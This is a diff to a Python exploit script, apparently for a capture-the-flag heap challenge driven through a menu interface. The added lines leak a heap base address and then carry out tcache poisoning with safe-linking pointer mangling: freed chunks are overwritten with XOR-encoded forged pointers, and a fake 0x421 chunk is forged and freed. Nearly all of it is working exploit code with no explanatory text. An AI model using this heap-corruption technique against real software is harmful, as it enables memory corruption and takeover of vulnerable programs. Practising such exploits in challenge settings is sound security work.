@@ -74,13 +74,27 @@ def main():
         return io.recvuntil("---- menu ----").strip(b"---- menu ----")
 
     new("A", "A" * 8)
-    heap_base = ptr.u64(view().split(b"A: AAAAAAAA")[1].split(b"\nroot")[0])
+    heap_base = ptr.u64(view().split(b"A: " + b"A" * 8)[1].split(b"\nroot")[0])
     heap_base = heap_base >> 12 << 12
     ptr.logger.info(f"heap_base = {hex(heap_base)}")
-
-    input(">>")
+    # delete("root")
+    # restart()
+    # delete("root")
+    # input(">>")
     new("B", "A" * 8)
+    delete("B")
+    delete("A")
+    delete("root")
+    change(ptr.p64((heap_base + 0x370) >> 12 ^ (heap_base + 0x540)), "A" * 8)
+    delete(ptr.p64((heap_base + 0x370) >> 12 ^ (heap_base + 0x540)))
+    new(ptr.p64((heap_base + 0x370) >> 12 ^ (heap_base + 0x360)), "A" * 8)
+    new("C", "A" * 8)
+    new("D", ptr.p64(0x421))
+    # 
     input(">>")
+    delete(ptr.p64(heap_base + 0x370))
+    input(">>")
+
     return
 
 
